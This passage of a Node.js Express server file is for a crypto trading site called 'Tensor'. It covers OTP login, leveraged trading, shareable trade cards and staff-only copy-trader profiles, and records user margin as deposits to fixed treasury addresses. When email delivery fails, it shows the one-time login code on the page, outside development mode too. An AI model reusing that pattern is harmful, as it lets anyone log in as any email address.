    rect(x, 380 - h, 16, h, good ? 14 : 246, good ? 203 : 70, good ? 129 : 93, 180);
  }

  const ihdr = Buffer.alloc(13);
  ihdr.writeUInt32BE(width, 0);
  ihdr.writeUInt32BE(height, 4);
  ihdr[8] = 8;
  ihdr[9] = 6;
  ihdr[10] = 0;
  ihdr[11] = 0;
  ihdr[12] = 0;

  const idat = zlib.deflateSync(raw);

  return Buffer.concat([
    Buffer.from([137, 80, 78, 71, 13, 10, 26, 10]),
    pngChunk('IHDR', ihdr),
    pngChunk('IDAT', idat),
    pngChunk('IEND', Buffer.alloc(0))
  ]);
}

/* -------------------- Pages -------------------- */

app.get('/', (req, res) => {
  return renderIndex(req, res);
});

app.get('/index.ejs', (req, res) => {
  return renderIndex(req, res);
});

app.get('/index.html', (req, res) => {
  return res.redirect('/');
});

app.get('/trading', requireAuth, (req, res) => {
  const db = readDb();
  const email = normalizeEmail(req.session.user.email);
  const user = db.users[email];

  if (!user) {
    req.session.destroy(() => {});
    return res.redirect('/');
  }

  migrateUser(user);
  updateUserPositions(user, db);

  return renderTrading(req, res, user);
});

app.get('/wallet', requireAuth, (req, res) => {
  return res.redirect('/trading');
});

app.get('/logout', (req, res) => {
  req.session.destroy(() => {
    res.redirect('/');
  });
});

app.get('/reset-session', (req, res) => {
  req.session.destroy(() => {
    res.redirect('/');
  });
});

/* -------------------- Auth Routes -------------------- */

app.post('/auth/request-otp', async (req, res) => {
  try {
    const email = normalizeEmail(req.body.email);

    if (!email || !email.includes('@')) {
      return renderIndex(req, res, {
        error: 'Enter a valid email.',
        email
      });
    }

    const otp = generateOtp();
    saveOtp(email, otp);

    const sent = await sendOtpEmail(email, otp);

    return renderIndex(req, res, {
      message: sent
        ? 'Verification code sent. Check your email.'
        : `Development mode: your verification code is ${otp}`,
      email
    });
  } catch (err) {
    console.error('OTP error:', err);

    return renderIndex(req, res, {
      error: IS_PROD ? 'Could not send verification code.' : err.message,
      email: normalizeEmail(req.body.email)
    });
  }
});

app.post('/auth/verify', (req, res) => {
  const email = normalizeEmail(req.body.email);
  const otp = String(req.body.otp || '').trim();

  const result = verifyOtp(email, otp);

  if (!result.ok) {
    return renderIndex(req, res, {
      error: result.reason,
      email
    });
  }

  const user = getOrCreateUser(email, 'user');

  req.session.user = {
    email: user.email,
    role: user.role,
    id: user.id
  };

  return res.redirect('/trading');
});

app.post('/staff/login', (req, res) => {
  const username = String(req.body.username || '').trim();
  const password = String(req.body.password || '').trim();

  if (username !== STAFF_USERNAME || password !== STAFF_PASSWORD) {
    return renderIndex(req, res, {
      error: 'Invalid staff login.'
    });
  }

  const user = getOrCreateUser(STAFF_EMAIL, 'staff');

  req.session.user = {
    email: user.email,
    role: 'staff',
    id: user.id
  };

  return res.redirect('/trading');
});

/* -------------------- API For trading.ejs -------------------- */

app.get('/api/session', (req, res) => {
  return res.json({
    authenticated: !!req.session.user,
    user: req.session.user || null
  });
});

app.get('/api/tensor', requireAuthJson, async (req, res) => {
  await syncRealCryptoPrices(false);

  const db = readDb();
  syncRegistryWithPrices(db);
  writeDb(db);

  return res.json({
    ok: true,
    registry: db.tensorRegistry,
    treasuryDestinations: TREASURY_USDT_ADDRESSES
  });
});

app.get('/api/tensor/chart', requireAuthJson, (req, res) => {
  const db = readDb();
  const token = getTokenByIdOrSymbol(db, req.query.tokenId);

  if (!token) {
    return res.status(404).json({
      ok: false,
      error: 'Token not found.',
      candles: []
    });
  }

  initializeCandlesForToken(token.id, token.price);

  const candles = tensorCandleHistory[token.id] || [];
  const last24hCutoff = Date.now() - 24 * 60 * 60 * 1000;
  const last24h = candles.filter(c => c.time >= last24hCutoff);

  const high24h = last24h.length
    ? Math.max(...last24h.map(c => safeNumber(c.high, token.price)))
    : token.high24h;

  const low24h = last24h.length
    ? Math.min(...last24h.map(c => safeNumber(c.low, token.price)))
    : token.low24h;

  const lifetimeHigh = Math.max(
    safeNumber(token.lifetimeHigh, token.price),
    ...candles.map(c => safeNumber(c.high, token.price))
  );

  return res.json({
    ok: true,
    tokenId: token.id,
    symbol: token.symbol,
    candles,
    stats: {
      high24h,
      low24h,
      lifetimeHigh,
      changePercent24h: safeNumber(token.changePercent24h, 0)
    }
  });
});

app.get('/api/trading/state', requireAuthJson, (req, res) => {
  const db = readDb();
  const user = db.users[normalizeEmail(req.session.user.email)];

  if (!user) {
    return res.status(404).json({ error: 'User not found.' });
  }

  migrateUser(user);
  updateUserPositions(user, db);
  writeDb(db);

  return res.json({
    ok: true,
    ...publicWallet(user),
    treasuryDestinations: TREASURY_USDT_ADDRESSES
  });
});

app.post('/api/trading/execute', requireAuthJson, (req, res) => {
  const db = readDb();
  const user = db.users[normalizeEmail(req.session.user.email)];

  if (!user) {
    return res.status(404).json({ error: 'User not found.' });
  }

  const token = getTokenByIdOrSymbol(db, req.body.tokenId);

  if (!token) {
    return res.status(404).json({ error: 'Asset not found.' });
  }

  const side = req.body.side === 'short' ? 'short' : 'long';
  const margin = Math.max(0, safeNumber(req.body.margin, 0));
  const leverage = Math.max(1, Math.min(150, safeNumber(req.body.leverage, 1)));
  const marginMode = req.body.marginMode === 'isolated' ? 'isolated' : 'cross';
  const currency = String(req.body.currency || 'USDT').toUpperCase();

  if (!['USDT', 'OUSD'].includes(currency)) {
    return res.status(400).json({ error: 'Currency must be USDT or OUSD.' });
  }

  if (margin <= 0) {
    return res.status(400).json({ error: 'Enter margin amount.' });
  }

  const balanceKey = currency === 'OUSD' ? 'ousdBalance' : 'usdtBalance';

  if (safeNumber(user[balanceKey], 0) < margin) {
    return res.status(400).json({ error: `Insufficient ${currency} balance.` });
  }

  const entryPrice = Math.max(0.000001, safeNumber(token.price, 1));
  const size = margin * leverage;

  const treasuryDestination = currency === 'USDT'
    ? getTreasuryDestination(user.usdtNetwork || 'eth')
    : getSolanaDestination();

  user[balanceKey] -= margin;

  const position = {
    id: makeId('pos'),
    tokenId: token.id,
    symbol: token.symbol,
    side,
    margin,
    leverage,
    size,
    entryPrice,
    markPrice: entryPrice,
    pnl: 0,
    roi: 0,
    marginMode,
    currency,
    status: 'open',
    openedAt: nowIso(),
    updatedAt: nowIso(),
    treasuryNetwork: treasuryDestination.network,
    treasuryAddress: treasuryDestination.address
  };

  const treasuryDeposit = {
    id: makeId('deposit'),
    userEmail: user.email,
    amount: margin,
    asset: currency,
    network: treasuryDestination.key,
    destination: treasuryDestination,
    purpose: 'trade-margin',
    status: 'recorded',
    createdAt: nowIso()
  };

  user.positions.unshift(position);
  user.tradeDeposits.unshift(treasuryDeposit);
  db.treasury.tradeDeposits.unshift(treasuryDeposit);

  user.updatedAt = nowIso();

  writeDb(db);

  return res.json({
    ok: true,
    position,
    usdtBalance: user.usdtBalance,
    ousdBalance: user.ousdBalance,
    usdtNetwork: user.usdtNetwork,
    treasuryDeposit,
    treasuryDestinations: TREASURY_USDT_ADDRESSES
  });
});

app.post('/api/trading/close', requireAuthJson, (req, res) => {
  const db = readDb();
  const user = db.users[normalizeEmail(req.session.user.email)];

  if (!user) {
    return res.status(404).json({ error: 'User not found.' });
  }

  const positionId = String(req.body.positionId || '');
  const index = user.positions.findIndex(p => String(p.id) === positionId && p.status === 'open');

  if (index === -1) {
    return res.status(404).json({ error: 'Open position not found.' });
  }

  const pos = user.positions[index];
  const token = getTokenByIdOrSymbol(db, pos.tokenId || pos.symbol);
  const closePrice = token ? safeNumber(token.price, pos.markPrice) : safeNumber(pos.markPrice, pos.entryPrice);

  const calc = calculatePosition(pos, closePrice);
  const returned = Math.max(0, safeNumber(pos.margin, 0) + calc.pnl);

  const historyRecord = {
    ...pos,
    markPrice: closePrice,
    closePrice,
    pnl: calc.pnl,
    roi: calc.roi,
    status: 'closed',
    closeReason: 'Market Close',
    closedAt: nowIso()
  };

  user.positions.splice(index, 1);
  user.orderHistory.unshift(historyRecord);

  if (pos.currency === 'OUSD') {
    user.ousdBalance += returned;
  } else {
    user.usdtBalance += returned;
  }

  const publicTradeCard = createTradeCard(db, user, historyRecord);

  user.publicTradeCards.unshift({
    id: publicTradeCard.id,
    tradeId: historyRecord.id,
    page: `/trade/${publicTradeCard.id}`,
    image: `/trade/${publicTradeCard.id}/download`,
    createdAt: Date.now()
  });

  user.updatedAt = nowIso();

  writeDb(db);

  return res.json({
    ok: true,
    usdtBalance: user.usdtBalance,
    ousdBalance: user.ousdBalance,
    historyRecord,
    publicTradeCard,
    shareUrl: `/trade/${publicTradeCard.id}`,
    imageUrl: `/trade/${publicTradeCard.id}/download`
  });
});

/* -------------------- Trade Sharing -------------------- */

function createTradeCard(db, user, trade) {
  const id = makePublicId('trade');

  const card = {
    id,
    tradeId: trade.id,
    userEmail: user.email,
    symbol: trade.symbol,
    side: trade.side,
    leverage: trade.leverage,
    currency: trade.currency || 'USDT',
    margin: trade.margin,
    size: trade.size,
    entryPrice: trade.entryPrice,
    closePrice: trade.closePrice || trade.markPrice,
    markPrice: trade.markPrice,
    pnl: trade.pnl,
    roi: trade.roi,
    closeReason: trade.closeReason || 'Market Close',
    openedAt: trade.openedAt,
    closedAt: trade.closedAt || nowIso(),
    createdAt: nowIso()
  };

  db.publicTradeCards[id] = card;
  return card;
}

app.post('/api/trading/share', requireAuthJson, (req, res) => {
  const db = readDb();
  const user = db.users[normalizeEmail(req.session.user.email)];

  if (!user) {
    return res.status(404).json({ error: 'User not found.' });
  }

  const historyId = String(req.body.historyId || '');
  const trade = user.orderHistory.find(t => String(t.id) === historyId);

  if (!trade) {
    return res.status(404).json({ error: 'History trade not found.' });
  }

  const publicTradeCard = createTradeCard(db, user, trade);
  const shareUrl = `${getBaseUrl(req)}/trade/${publicTradeCard.id}`;
  const imageUrl = `${getBaseUrl(req)}/trade/${publicTradeCard.id}/download`;

  user.publicTradeCards.unshift({
    id: publicTradeCard.id,
    tradeId: trade.id,
    page: shareUrl,
    image: imageUrl,
    createdAt: Date.now()
  });

  writeDb(db);

  return res.json({
    ok: true,
    publicTradeCard,
    shareUrl,
    imageUrl
  });
});

app.get('/trade/:id', (req, res) => {
  const db = readDb();
  const card = db.publicTradeCards[req.params.id];

  if (!card) {
    return res.status(404).send('Trade card not found.');
  }

  return res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <title>${escapeHtml(card.symbol)} Trade</title>
      <meta name="viewport" content="width=device-width,initial-scale=1">
      <style>
        body{margin:0;background:#0b0e11;color:#eaecef;font-family:Inter,Arial,sans-serif;display:grid;place-items:center;min-height:100vh;padding:20px}
        .card{max-width:520px;width:100%;background:#1e2329;border:1px solid #2b3139;border-radius:18px;padding:24px;box-shadow:0 24px 80px rgba(0,0,0,.35)}
        .side{display:inline-block;padding:6px 10px;border-radius:8px;font-weight:900;text-transform:uppercase;background:${card.side === 'long' ? 'rgba(14,203,129,.15)' : 'rgba(246,70,93,.15)'};color:${card.side === 'long' ? '#0ecb81' : '#f6465d'}}
        h1{margin:16px 0 8px;font-size:34px}
        .pnl{font-size:38px;font-weight:900;color:${safeNumber(card.pnl,0) >= 0 ? '#0ecb81' : '#f6465d'}}
        .row{display:flex;justify-content:space-between;border-top:1px solid #2b3139;padding:12px 0;color:#848E9C}
        .row b{color:#eaecef}
        a{display:block;text-align:center;background:#8b5cf6;color:white;text-decoration:none;padding:14px;border-radius:12px;font-weight:900;margin-top:18px}
      </style>
    </head>
    <body>
      <div class="card">
        <span class="side">${escapeHtml(card.side)} ${safeNumber(card.leverage,1)}x</span>
        <h1>${escapeHtml(card.symbol)} / USDT</h1>
        <div class="pnl">${safeNumber(card.pnl,0) >= 0 ? '+' : ''}$${safeNumber(card.pnl,0).toFixed(2)}</div>
        <div style="color:#848E9C;font-weight:800;margin-bottom:18px">${safeNumber(card.roi,0) >= 0 ? '+' : ''}${safeNumber(card.roi,0).toFixed(2)}% ROI</div>
        <div class="row"><span>Entry</span><b>$${formatPrice(card.entryPrice)}</b></div>
        <div class="row"><span>Close</span><b>$${formatPrice(card.closePrice)}</b></div>
        <div class="row"><span>Margin</span><b>${safeNumber(card.margin,0).toFixed(2)} ${escapeHtml(card.currency)}</b></div>
        <div class="row"><span>Size</span><b>${safeNumber(card.size,0).toFixed(2)} ${escapeHtml(card.currency)}</b></div>
        <a href="/trade/${encodeURIComponent(card.id)}/download">Download PNG</a>
      </div>
    </body>
    </html>
  `);
});

app.get('/trade/:id/download', (req, res) => {
  const db = readDb();
  const card = db.publicTradeCards[req.params.id];

  if (!card) {
    return res.status(404).send('Trade card not found.');
  }

  const png = makeTradePng(card);

  res.setHeader('Content-Type', 'image/png');
  res.setHeader('Content-Disposition', `attachment; filename="${card.symbol}-${card.side}-trade.png"`);
  return res.send(png);
});

/* -------------------- Copy Trading -------------------- */

app.get('/api/trading/copy-profiles', requireAuthJson, (req, res) => {
  const db = readDb();

  const profiles = Object.values(db.users || {})
    .filter(user => user.copyState?.isCopyTrader)
    .map(user => {
      const totalPnl = [...(user.orderHistory || []), ...(user.positions || [])]
        .reduce((sum, p) => sum + safeNumber(p.pnl, 0), 0);

      return {
        walletId: user.id,
        traderName: user.role === 'staff' ? 'Tensor Master Trader' : `Trader ${String(user.id).slice(-6)}`,
        totalPnl,
        followers: Object.values(db.users || {}).filter(u => u.copyState?.copyingTarget === user.id).length,
        link: `/copy/${user.id}`
      };
    });

  return res.json({
    ok: true,
    profiles
  });
});

app.post('/api/trading/copy-profile/toggle', requireAuthJson, (req, res) => {
  const db = readDb();
  const user = db.users[normalizeEmail(req.session.user.email)];

  if (!user) {
    return res.status(404).json({ error: 'User not found.' });
  }

  if (user.role !== 'staff') {
    return res.status(403).json({ error: 'Only staff can publish a copy profile.' });
  }

  user.copyState.isCopyTrader = !user.copyState.isCopyTrader;
  user.updatedAt = nowIso();

  writeDb(db);

  return res.json({
    ok: true,
    isCopyTrader: user.copyState.isCopyTrader
  });
});

app.get('/copy/:walletId', (req, res) => {
  const db = readDb();
  const user = Object.values(db.users || {}).find(u => u.id === req.params.walletId);

  if (!user || !user.copyState?.isCopyTrader) {
    return res.status(404).send('Copy profile not found.');
  }

  const pnl = [...(user.orderHistory || []), ...(user.positions || [])]
    .reduce((sum, p) => sum + safeNumber(p.pnl, 0), 0);

  return res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <title>Tensor Copy Profile</title>
      <meta name="viewport" content="width=device-width,initial-scale=1">
      <style>
        body{margin:0;background:#0b0e11;color:#eaecef;font-family:Inter,Arial,sans-serif;display:grid;place-items:center;min-height:100vh;padding:20px}
        .card{max-width:520px;width:100%;background:#1e2329;border:1px solid #2b3139;border-radius:18px;padding:24px}
        .pnl{font-size:36px;font-weight:900;color:${pnl >= 0 ? '#0ecb81' : '#f6465d'}}
      </style>
    </head>
    <body>
      <div class="card">
        <h1>${user.role === 'staff' ? 'Tensor Master Trader' : 'Tensor Trader'}</h1>
        <p style="color:#848E9C">Public copy trading profile</p>
        <div class="pnl">${pnl >= 0 ? '+' : ''}$${pnl.toFixed(2)}</div>
        <p>Open Tensor and press Copy Trader to copy this profile.</p>
      </div>
    </body>
    </html>
  `);
});

app.post('/api/trading/copy/start', requireAuthJson, (req, res) => {
  const db = readDb();
  const user = db.users[normalizeEmail(req.session.user.email)];

  if (!user) {
    return res.status(404).json({ error: 'User not found.' });
  }

  const targetWalletId = String(req.body.targetWalletId || '');
  const target = Object.values(db.users || {}).find(u => u.id === targetWalletId);

  if (!target || !target.copyState?.isCopyTrader) {
    return res.status(404).json({ error: 'Trader is not available for copying.' });
  }

  if (target.id === user.id) {
    return res.status(400).json({ error: 'You cannot copy yourself.' });
  }

  const amount = Math.max(0, safeNumber(req.body.amount, 0));
  const currency = String(req.body.currency || 'USDT').toUpperCase();

  if (!['USDT', 'OUSD'].includes(currency)) {
    return res.status(400).json({ error: 'Currency must be USDT or OUSD.' });
  }

  if (amount <= 0) {
    return res.status(400).json({ error: 'Enter a valid copy amount.' });
  }

  const balanceKey = currency === 'OUSD' ? 'ousdBalance' : 'usdtBalance';

  if (safeNumber(user[balanceKey], 0) < amount) {
    return res.status(400).json({ error: `Insufficient ${currency} balance.` });
  }

  user[balanceKey] -= amount;

  const openTargetPositions = (target.positions || []).filter(p => p.status === 'open');
  const perPosition = openTargetPositions.length > 0 ? amount / openTargetPositions.length : 0;

  user.copyState.copyingTarget = target.id;
  user.copyState.copyBalance = amount;
  user.copyState.activeCopyTrades = [];

  openTargetPositions.forEach(src => {
    user.copyState.activeCopyTrades.push({
      id: makeId('copypos'),
      sourcePositionId: src.id,
      tokenId: src.tokenId,
      symbol: src.symbol,
      side: src.side,
      margin: perPosition,
      leverage: src.leverage,
      size: perPosition * src.leverage,
      entryPrice: src.entryPrice,
      markPrice: src.markPrice,
      pnl: 0,
      roi: 0,
      marginMode: src.marginMode || 'cross',
      currency: 'COPY',
      status: 'open',
      openedAt: nowIso(),
      updatedAt: nowIso(),
      treasuryNetwork: TREASURY_USDT_ADDRESSES.sol.network,
      treasuryAddress: TREASURY_USDT_ADDRESSES.sol.address
    });
  });

  const deposit = {
    id: makeId('copydeposit'),
    userEmail: user.email,
    amount,
    asset: currency,
    network: 'sol',
    destination: getSolanaDestination(),
    purpose: 'copy-trading',
    status: 'recorded',
    createdAt: nowIso()
  };

  user.tradeDeposits.unshift(deposit);
  db.treasury.tradeDeposits.unshift(deposit);

  user.updatedAt = nowIso();

  writeDb(db);

  return res.json({
    ok: true,
    state: publicWallet(user),
    deposit
  });
});

app.post('/api/trading/copy/stop', requireAuthJson, (req, res) => {
  const db = readDb();
  const user = db.users[normalizeEmail(req.session.user.email)];

  if (!user) {
    return res.status(404).json({ error: 'User not found.' });
  }

  let returned = 0;

  user.copyState.activeCopyTrades.forEach(pos => {
    if (pos.status !== 'open') return;

    const markPrice = getMarketPrice(db, pos.tokenId || pos.symbol);
    const calc = calculatePosition(pos, markPrice);

    const finalReturn = Math.max(0, safeNumber(pos.margin, 0) + calc.pnl);

    pos.markPrice = markPrice;
    pos.pnl = calc.pnl;
    pos.roi = calc.roi;
    pos.status = 'closed';
    pos.closedAt = nowIso();
    pos.finalReturn = finalReturn;

    returned += finalReturn;
  });

  user.usdtBalance += returned;
  user.copyState.copyingTarget = null;
  user.copyState.copyBalance = 0;
  user.copyState.activeCopyTrades = [];

  user.updatedAt = nowIso();

  writeDb(db);

  return res.json({
    ok: true,
    returned,
    state: publicWallet(user)
  });
});

/* -------------------- Compatibility APIs -------------------- */

app.get('/api/prices', requireAuthJson, async (req, res) => {
  await syncRealCryptoPrices(false);

  const db = readDb();

  return res.json({
    ok: true,
    prices: latestRealPrices,
    registry: db.tensorRegistry
  });
});

app.get('/api/registry', requireAuthJson, (req, res) => {
  const db = readDb();

  return res.json({
    ok: true,
    registry: db.tensorRegistry
  });
});

/* -------------------- Error Handling -------------------- */

app.use((req, res) => {
  if (req.path.startsWith('/api')) {
    return res.status(404).json({
      error: 'API route not found.',
      path: req.path
    });
  }

  return res.status(404).send(`
    <!DOCTYPE html>
    <html>
    <head>
      <title>404</title>
      <meta name="viewport" content="width=device-width,initial-scale=1">
      <style>
        body{background:#0b0e11;color:#eaecef;font-family:Arial,sans-serif;display:grid;place-items:center;min-height:100vh}
        a{color:#8b5cf6}
      </style>
    </head>
    <body>
      <div>
        <h1>Page not found</h1>
        <a href="/">Go home</a>
      </div>
    </body>
    </html>
  `);
});

app.use((err, req, res, next) => {
  console.error('SERVER ERROR:', err);

  if (req.path.startsWith('/api')) {
    return res.status(500).json({
      error: 'Server error.',
      details: IS_PROD ? undefined : err.message
    });
  }

  return res.status(500).send(`
    <!DOCTYPE html>
    <html>
    <head>
      <title>Server Error</title>
      <meta name="viewport" content="width=device-width,initial-scale=1">
      <style>
        body{background:#0b0e11;color:#eaecef;font-family:Arial,sans-serif;padding:20px}
        pre{white-space:pre-wrap;background:#1e2329;border:1px solid #2b3139;border-radius:12px;padding:16px;color:#f6465d}
        a{color:#8b5cf6}
      </style>
    </head>
    <body>
      <h1>Server Error</h1>
      <p>The server caught the error instead of crashing.</p>
      <pre>${escapeHtml(IS_PROD ? 'Server error.' : err.stack || err.message)}</pre>
      <a href="/reset-session">Reset session</a>
    </body>
    </html>
  `);
});

/* -------------------- Start -------------------- */

ensureDb();

syncRealCryptoPrices(true)
  .catch(err => console.error('Initial price sync failed:', err.message));

setInterval(marketLoop, MARKET_LOOP_MS);

app.listen(PORT, () => {
  console.log(`Tensor server running on port ${PORT}`);
  console.log(`Index: views/index.ejs or fallback HTML`);
  console.log(`Trading: views/trading.ejs`);
});